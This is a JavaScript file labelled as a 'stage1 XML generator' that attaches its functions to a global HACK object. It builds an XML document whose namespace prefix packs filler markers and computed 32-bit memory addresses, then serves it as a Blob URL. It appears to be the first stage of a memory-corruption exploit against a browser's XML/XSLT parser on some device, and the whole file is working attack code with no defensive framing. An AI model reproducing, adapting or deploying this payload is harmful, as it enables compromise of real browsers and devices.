/* hondamaster static stage1 XML generator (same bytes as /root/data.xml) */
(function () {
  var HACK = window.HACK = window.HACK || {};
  var urls = [];

  function pack32(value) {
    value = value >>> 0;
    return String.fromCharCode(
      value & 0xff,
      (value >>> 8) & 0xff,
      (value >>> 16) & 0xff,
      (value >>> 24) & 0xff
    );
  }

  function stage1Xml(base, nextaddr) {
    base = base >>> 0;

    var ns = '';
    ns += 'XXXX' + 'YYYY';
    ns += pack32((base + 0x230) >>> 0);
    ns += pack32((base + 0x130) >>> 0);
    ns += 'LLLL';
    ns += pack32((base + 0x44) >>> 0);
    if (nextaddr === undefined || nextaddr === null) {
      ns += pack32((base + 0x44) >>> 0);
    } else {
      ns += pack32(nextaddr >>> 0);
    }
    ns += pack32((base + 0x70) >>> 0);
    ns += pack32((base + 0x34) >>> 0);
    ns += 'NNNN';
    ns += pack32((base + 0x230) >>> 0);
    ns += 'PPPP';
    ns += 'DDDD';
    ns += 'pppp';
    ns += 'll';
    ns += 'ee';

    var doc = '';
    doc += '<?xml version="1.0" encoding="UTF-8"?>\n';
    doc += '<?xml-stylesheet type="text/xsl" href="stylesheet.xsl"?>\n';
    doc += '<' + ns + ':basebandURI xmlns:' + ns + '="basebandName">roottext<root/></' + ns + ':basebandURI>';
    doc += '\n';
    return doc;
  }

  function stringToArrayBuffer(str) {
    var len = str.length;
    var buffer = new ArrayBuffer(len);
    var bytes = new Uint8Array(buffer);
    for (var i = 0; i < len; i++) bytes[i] = str.charCodeAt(i) & 0xff;
    return buffer;
  }

  HACK.dataXml = function (base, nextaddr) {
    var xml = stage1Xml(base, nextaddr);
    var buffer = stringToArrayBuffer(xml);
    var blob;
    if (window.WebKitBlobBuilder) {
      var bb = new WebKitBlobBuilder();
      bb.append(buffer);
      blob = bb.getBlob('text/xml');
    } else {
      blob = new Blob([buffer], { type: 'text/xml' });
    }
    var U = window.webkitURL || window.URL;
    var url = U.createObjectURL(blob);
    urls.push(url);
    return url;
  };

  HACK.stage1Xml = stage1Xml;
})();
